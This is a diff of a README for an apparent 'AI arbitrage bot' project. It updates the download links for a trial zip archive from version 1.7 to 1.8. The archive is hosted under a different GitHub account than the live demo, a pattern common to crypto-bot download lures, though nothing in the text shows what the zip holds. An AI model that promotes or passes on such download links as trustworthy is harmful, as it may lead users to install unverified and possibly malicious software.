@@ -8,7 +8,7 @@
 
 <!-- pages-links:start -->
 [![VIEW DEMO](docs/view-demo.svg)](https://keenlocation.github.io/dca/)
-[![DOWNLOAD](docs/download-project.svg)](https://github.com/wordystepuncl/ai-arbitrage-bot/releases/download/Trialv1.7/Trialv1.7.zip)
+[![DOWNLOAD](docs/download-project.svg)](https://github.com/wordystepuncl/ai-arbitrage-bot/releases/download/Trialv1.8/Trialv1.8.zip)
 
 [Live demo](https://keenlocation.github.io/dca/) · [Run locally](#run-locally)
 <!-- pages-links:end -->
@@ -111,4 +111,4 @@ No analytics, trading credentials or wallet access. The journal remains in tab m
 
 ## Download the trial
 
-The **DOWNLOAD** button and the in-demo **Download trial** button link to [Trialv1.7.zip](https://github.com/wordystepuncl/ai-arbitrage-bot/releases/download/Trialv1.7/Trialv1.7.zip) from the **Trialv1.7** GitHub release.
+The **DOWNLOAD** button and the in-demo **Download trial** button link to [Trialv1.8.zip](https://github.com/wordystepuncl/ai-arbitrage-bot/releases/download/Trialv1.8/Trialv1.8.zip) from the **Trialv1.8** GitHub release.
